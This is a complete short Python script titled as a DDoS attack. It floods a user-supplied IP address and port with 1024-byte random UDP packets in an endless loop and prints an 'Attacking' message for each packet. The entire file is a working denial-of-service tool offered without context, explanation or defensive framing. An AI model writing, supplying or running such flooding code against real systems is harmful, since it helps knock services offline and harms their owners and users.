import socket
import random
import time

def ddos_attack(target_ip, target_port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        sock.sendto(bytes, (target_ip, target_port))
        print(f"Attacking {target_ip} on port {target_port} with {len(bytes)} bytes")
        time.sleep(0.01)

if __name__ == "__main__":
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))
    ddos_attack(target_ip, target_port)
